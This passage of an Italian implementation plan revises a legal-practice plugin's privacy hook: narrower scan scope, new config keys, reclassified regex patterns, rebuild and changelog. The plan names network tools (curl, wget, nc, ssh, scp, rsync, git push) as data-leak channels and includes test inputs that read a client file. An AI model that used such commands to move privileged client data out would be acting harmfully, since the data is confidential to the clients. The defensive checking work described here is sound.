echo '{"tool_name":"WebFetch","tool_input":{"url":"https://example.com","content":"segreto professionale del cliente Rossi"},"cwd":"/tmp"}' | node bettercallclaude_italia/scripts/privacy-check.js
echo '{"tool_name":"Bash","tool_input":{"command":"cat /fascicoli/Rossi/doc.txt"},"cwd":"/tmp"}' | node bettercallclaude_italia/scripts/privacy-check.js
```
Expected: il primo non stampa nulla (exit 0, Write escluso); il secondo stampa JSON con `permissionDecision: "ask"` e reason che inizia con `[privacy-check] tool=WebFetch mode=balanced categoria=segreto-professionale`; il terzo stampa `permissionDecision: "ask"` (path privilegiato via NEW-2) con prefisso `tool=Bash`.

- [ ] **Step 6: Commit**

```bash
git add bettercallclaude_italia/scripts/privacy-check.js bettercallclaude_italia/scripts/privacy-check.test.js
git commit -m "feat(privacy): perimetro di scansione solo uscite di rete di default, esenzioni per cartella, reason diagnostici con tool/mode/categoria"
```

---

### Task 4: Manifest plugin.json e hooks.json

**Files:**
- Modify: `bettercallclaude_italia/.claude-plugin/plugin.json` (versione, `privacy_mode`, nuove chiavi)
- Modify: `bettercallclaude_italia/hooks/hooks.json` (descrizione)

**Interfaces:**
- Consumes: nomi esatti env e chiavi userConfig definiti al Task 2/3.
- Produces: chiavi `userConfig` leggibili dall'hook via `CLAUDE_PLUGIN_OPTION_PRIVACY_MODE`, `CLAUDE_PLUGIN_OPTION_SCAN_LOCAL_WRITES`, `CLAUDE_PLUGIN_OPTION_PRIVACY_EXEMPT_PATHS`.

- [ ] **Step 1: Bump versione e aggiorna userConfig in plugin.json**

In `bettercallclaude_italia/.claude-plugin/plugin.json`:
- `"version": "2.4.5"` → `"2.4.6"`.
- Sostituisci la chiave `privacy_mode` con:

```json
    "privacy_mode": {
      "type": "string",
      "title": "Modalità privacy",
      "description": "Livello di protezione del segreto professionale sulle chiamate in uscita. strict = blocco (deny) di pattern forti e di pattern deboli/riferimenti con contesto; balanced = conferma (ask) su pattern forti e deboli/riferimenti con contesto; cloud = conferma (ask) solo su pattern forti.",
      "default": "balanced",
      "options": ["strict", "balanced", "cloud"],
      "sensitive": false
    },
```

- Aggiungi dopo `privacy_mode` le due nuove chiavi:

```json
    "scan_local_writes": {
      "type": "boolean",
      "title": "Scansiona scritture locali",
      "description": "Quando false (default), l'hook privacy controlla solo le chiamate in uscita di rete (WebFetch, tool MCP, comandi Bash di rete); Write/Edit/MultiEdit su file locali non sono scannerizzati perche non trasmettono dati. Impostare true per ripristinare la scansione completa di tutti i tool.",
      "default": false,
      "sensitive": false
    },
    "privacy_exempt_paths": {
      "type": "string",
      "title": "Cartelle escluse dal controllo privacy",
      "description": "Elenco di cartelle escluse dal controllo del segreto professionale, separate da punto e virgola (espansione di ~ supportata). Utile per cartelle editoriali o non legali. Esempio: ~/Documenti/blog;~/progetti/linkedin.",
      "default": "",
      "sensitive": false
    },
```

- [ ] **Step 2: Aggiorna la descrizione in hooks.json**

In `bettercallclaude_italia/hooks/hooks.json` sostituisci `description` con:

```
Rilevamento segreto professionale per la pratica legale italiana. Di default scansiona solo le chiamate in uscita di rete (WebFetch, comandi Bash di rete, input tool MCP); Write/Edit/MultiEdit locali sono esclusi (riattivabili con userConfig scan_local_writes). Pattern forti: DENY in strict, ASK in balanced/cloud. Pattern deboli e riferimenti normativi con contesto cliente/causa: DENY in strict, ASK in balanced, ignorati in cloud. Cartelle esenti configurabili via userConfig privacy_exempt_paths.
```

- [ ] **Step 3: Verifica validazione**

Run: `node scripts/validate-plugin.js`
Expected: output di validazione OK per il plugin (il nome esatto dello script e i suoi argomenti sono quelli del repo; se lo script richiede un argomento percorso, passare `bettercallclaude_italia`).

- [ ] **Step 4: Commit**

```bash
git add bettercallclaude_italia/.claude-plugin/plugin.json bettercallclaude_italia/hooks/hooks.json
git commit -m "chore(privacy): v2.4.6, chiavi userConfig scan_local_writes e privacy_exempt_paths, descrizioni allineate al comportamento"
```

---

### Task 5: Parità nel server Ollama (privacy.ts + rebuild)

**Files:**
- Modify: `bettercallclaude_italia/mcp-servers/ollama/src/privacy.ts`
- Rebuild: `bettercallclaude_italia/mcp-servers/ollama/dist/*` (via `npm run build:bundle` — `dist/index.js` e' il bundle esbuild puntato da `.mcp.json`)

**Interfaces:**
- Consumes: semantica di classificazione del Task 1.
- Produces: `classifyPrivacy(text)` con gli stessi pattern riorclassificati (riferimenti normativi e clausole boilerplate → CONFIDENTIAL con discriminator).

- [ ] **Step 1: Aggiorna privacy.ts**

In `bettercallclaude_italia/mcp-servers/ollama/src/privacy.ts`:
1. Da `PRIVILEGED_PATTERNS` rimuovi le voci `segreto commerciale`, `vincolo di riservatezza`, `obbligo di riservatezza` e le 7 voci di riferimento normativo (`Art. 622 CP`, `L. 247/2012`, `CDF Art. 13`, `CDF Art. 28`, `Art. 663 CP`, `Art. 200 CPP`, `Art. 103 CPP`), cioe' tutto il blocco `// Legal article references -- Italian`.
2. Aggiungi in cima a `CONFIDENTIAL_PATTERNS` (prima di `riservato`):

```ts
  // Reference patterns (v2.4.6) — norm citations and contract boilerplate,
  // weak: they only count with a client/case discriminator.
  { regex: /\bsegreto\s+commerciale\b/i, meaning: 'Segreto commerciale (con contesto legale)', language: 'it', level: 'CONFIDENTIAL' },
  { regex: /\bvincolo\s+(?:di\s+)?riservatezza\b/i, meaning: 'Vincolo di riservatezza (con contesto legale)', language: 'it', level: 'CONFIDENTIAL' },
  { regex: /\bobbligo\s+di\s+riservatezza\b/i, meaning: 'Obbligo di riservatezza (con contesto legale)', language: 'it', level: 'CONFIDENTIAL' },
  { regex: /\bArt\.?\s*622\s*C\.?\s*P\.?\b/i, meaning: 'Art. 622 CP (citazione, con contesto)', language: 'legal', level: 'CONFIDENTIAL' },
  { regex: /\bL\.?\s*247[/]2012\b/i, meaning: 'L. 247/2012 (citazione, con contesto)', language: 'legal', level: 'CONFIDENTIAL' },
  { regex: /\bCDF\s+Art\.?\s*13\b/i, meaning: 'CDF Art. 13 (citazione, con contesto)', language: 'legal', level: 'CONFIDENTIAL' },
  { regex: /\bCDF\s+Art\.?\s*28\b/i, meaning: 'CDF Art. 28 (citazione, con contesto)', language: 'legal', level: 'CONFIDENTIAL' },
  { regex: /\bArt\.?\s*663\s*C\.?\s*P\.?\b/i, meaning: 'Art. 663 CP (citazione, con contesto)', language: 'legal', level: 'CONFIDENTIAL' },
  { regex: /\bArt\.?\s*200\s*C\.?\s*P\.?\s*P\.?\b/i, meaning: 'Art. 200 CPP (citazione, con contesto)', language: 'legal', level: 'CONFIDENTIAL' },
  { regex: /\bArt\.?\s*103\s*C\.?\s*P\.?\s*P\.?\b/i, meaning: 'Art. 103 CPP (citazione, con contesto)', language: 'legal', level: 'CONFIDENTIAL' },
```

3. Sostituisci `DISCRIMINATOR_CONTENT` con la versione ristretta (stessa del Task 1):

```ts
// v2.4.6: narrowed to client/case-identifying terms (mirrors the hook).
const DISCRIMINATOR_CONTENT = new RegExp(
  '\\b(' +
  'cliente|clienti|client|mandante|mandanti' +
  '|dossier|numero\\s+di\\s+pratica|riferimento\\s+atto' +
  '|parte\\s+avversa|controparte' +
  ')\\b',
  'i'
);
```

Nota: `hasDiscriminator` itera gia' su `CONFIDENTIAL_PATTERNS` per la regola dei 2 segnali, quindi i reference patterns contano automaticamente anche li'.

- [ ] **Step 2: Rebuild del server**

Run:
```bash
cd bettercallclaude_italia/mcp-servers/ollama && npm install && npm run build:bundle
```
Expected: `tsc` compila senza errori e esbuild rigenera `dist/index.js` (shebang + bundle). Se `node_modules` e' gia' presente, `npm install` e' un no-op veloce.

- [ ] **Step 3: Verifica rapida della riclassificazione**

Run:
```bash
cd bettercallclaude_italia/mcp-servers/ollama && node -e "const {classifyPrivacy}=require('./dist/privacy.js'); console.log(classifyPrivacy('Riferimento: l. 247/2012.').level); console.log(classifyPrivacy('segreto professionale del cliente').level); console.log(classifyPrivacy('obbligo di riservatezza del fornitore').level);"
```
Expected: `PUBLIC`, `PRIVILEGED`, `PUBLIC`.

- [ ] **Step 4: Commit**

```bash
git add bettercallclaude_italia/mcp-servers/ollama/src/privacy.ts bettercallclaude_italia/mcp-servers/ollama/dist
git commit -m "fix(ollama): allinea classificazione privacy ai pattern deboli v2.4.6, rebuild bundle"
```

---

### Task 6: Documentazione (comando /privacy, skill, CHANGELOG)

**Files:**
- Modify: `bettercallclaude_italia/commands/privacy.md`
- Modify: `bettercallclaude_italia/skills/privacy-routing/SKILL.md`
- Modify: `CHANGELOG.md`

**Interfaces:**
- Consumes: comportamento finale di hook e configurazioni (Task 1-4).
- Produces: docs coerenti con il codice.

- [ ] **Step 1: Aggiorna commands/privacy.md**

1. Nella tabella delle modalita' (output di visualizzazione), sostituisci le righe pattern forti/deboli con:

```
| Modalita | Pattern forti | Pattern deboli/riferimenti con contesto | Tool locali |
|----------|--------------|------------------------------------------|-------------|
| strict | BLOCCATO (deny) | BLOCCATO (deny) | Sempre permesso |
|        | Contenuto non privilegiato passa (server MCP cloud usabili) | | |
| **balanced** | Conferma richiesta (ask) | Conferma richiesta (ask) | Sempre permesso |
| cloud | Conferma richiesta (ask) | Permesso senza prompt | Sempre permesso |
```

2. Aggiorna il paragrafo `Pattern forti`/`Pattern deboli`:

```
Pattern forti: segreto professionale, segreto del mandato, segreto istruttorio,
riserbatissimo, strettamente riservato, attorney-client privilege, work product, ecc.

Pattern deboli e riferimenti normativi: riservato, confidenziale, privato,
non divulgare, uso interno, Art. 622 CP, L. 247/2012, CDF Art. 13/28,
Art. 200/103 CPP, obbligo/vincolo di riservatezza, segreto commerciale —
contano solo insieme a un contesto cliente/causa (cliente, mandante, dossier,
controparte, oppure 2+ segnali deboli), perche citare la norma sul segreto
non equivale a violarlo.
```

3. Aggiungi dopo la tabella una sezione `## Perimetro di scansione (v2.4.6)` nel testo del comando:

```
## Perimetro di scansione

Di default l'hook controlla solo le chiamate in uscita di rete: WebFetch,
tool MCP non locali e comandi Bash capaci di inviare dati (curl, wget, nc,
ssh, scp, rsync, git push, ...). Write/Edit/MultiEdit su file locali non
sono scannerizzati: scrivere un file locale non trasmette dati.

Configurazione (pannello /config del plugin o settings.json):
- privacy_mode: strict | balanced | cloud
- scan_local_writes: true ripristina la scansione completa di tutti i tool
- privacy_exempt_paths: cartelle escluse, separate da ";" (es. ~/Documenti/blog;~/progetti/linkedin)

Nota: la modalita base si configura nel pannello /config (userConfig privacy_mode,
ricevuta dall'hook come variabile d'ambiente). Il file .privacy-mode nel progetto
puo solo alzare la severita rispetto alla modalita base, mai abbassarla.
```

4. Nel passo 3 di `Cambia modalita`, aggiungi la nota che la modalita base esplicita in userConfig resta valida e il file puo solo alzare.

- [ ] **Step 2: Aggiorna skills/privacy-routing/SKILL.md`

Nella tabella `Pattern di Riferimento Normativo` cambia il livello da `PRIVILEGIATO` a `CONFIDENZIALE (con contesto)` per tutte le voci, e nella tabella italiana `segreto commerciale` da `PRIVILEGIATO` a `CONFIDENZIALE (con contesto)`. Aggiungi una riga di spiegazione: `Riferimenti normativi e clausole contrattuali standard contano solo con contesto cliente/causa: citare la norma sul segreto non equivale a violarlo.`

- [ ] **Step 3: Voce CHANGELOG**

Aggiungi in cima a `CHANGELOG.md` dopo la riga `---`:

```markdown
## [2.4.6] - 2026-10-31

### Fixed
- **Falsi positivi dell'hook privacy su citazioni normative e lessico contrattuale** (segnalazione utente su Cowork): Art. 622 CP, L. 247/2012, CDF Art. 13/28, Artt. 200/103/663 CPP, «obbligo/vincolo di riservatezza» e «segreto commerciale» sono ora pattern deboli — contano solo con contesto cliente/causa (cliente, mandante, dossier, controparte o 2+ segnali). Il discriminator di contesto e' ristretto ai termini identificativi di cliente/causa: «avvocato», «giudice», «tribunale», «ricorso» e simili (presenti in quasi ogni testo legale) non attivano piu' i pattern deboli.
- **`userConfig.privacy_mode` ignorato**: gli hook ricevono la configurazione del plugin come variabili d'ambiente `CLAUDE_PLUGIN_OPTION_*` (la stdin non la include). La modalita scelta in `/config` ha ora effetto; il file `.privacy-mode` puo solo alzare la severita' rispetto alla modalita' base.

### Changed
- **Perimetro di scansione di default: solo uscite di rete.** L'hook controlla WebFetch, tool MCP non locali e comandi Bash di rete (curl, wget, nc, ssh, scp, rsync, git push); Write/Edit/MultiEdit locali non sono scannerizzati perche' non trasmettono dati. Nuova chiave `userConfig.scan_local_writes` (default false) per ripristinare la scansione completa.
- **Nuova chiave `userConfig.privacy_exempt_paths`**: elenco di cartelle escluse dal controllo (separate da `;`, `~` espanso), configurabile nelle impostazioni del plugin — nessun file della cartella di lavoro puo' modificare la protezione.
- **Messaggi di decisione diagnostici**: ogni blocco/conferma inizia con `[privacy-check] tool=... mode=... categoria=... match="..."` cosi' il motivo e' leggibile in ogni superficie (Cowork mostra un errore generico del percorso che non e' testo dell'hook).
- Documentazione allineata: descrizioni di `privacy_mode` in `plugin.json` e tabella modalita' del comando `/privacy` corrispondono al comportamento reale (ask su pattern forti in balanced/cloud, deny solo in strict).

### Notes
- Allineata la classificazione del server Ollama locale (`classifyPrivacy`) agli stessi pattern.
```

- [ ] **Step 4: Commit**

```bash
git add bettercallclaude_italia/commands/privacy.md bettercallclaude_italia/skills/privacy-routing/SKILL.md CHANGELOG.md
git commit -m "docs(privacy): allinea /privacy, skill privacy-routing e changelog al comportamento v2.4.6"
```

---

### Task 7: Verifica finale

**Files:** nessuna modifica; solo verifica.

- [ ] **Step 1: Test completi**

Run: `node bettercallclaude_italia/scripts/privacy-check.test.js`
Expected: `N passed, 0 failed` con N > 70.

- [ ] **Step 2: Validazione plugin**

Run: `node scripts/validate-plugin.js bettercallclaude_italia` (o il percorso d'uso dello script; verificare con `node scripts/validate-plugin.js --help` se necessario)
Expected: validazione OK, nessun errore su plugin.json/hooks.json.

- [ ] **Step 3: Verifica working tree pulito**

Run: `git status --short`
Expected: solo file non tracciati attesi (eventuali .privacy-mode di test devono essere stati rimossi dai `finally` dei test; se presente, eliminarlo).

- [ ] **Step 4: Riepilogo per il segnalante**

Preparare un riepilogo in italiano delle modifiche e delle risposte punto-per-punto alle 6 proposte del segnalante da includere nel messaggio finale.
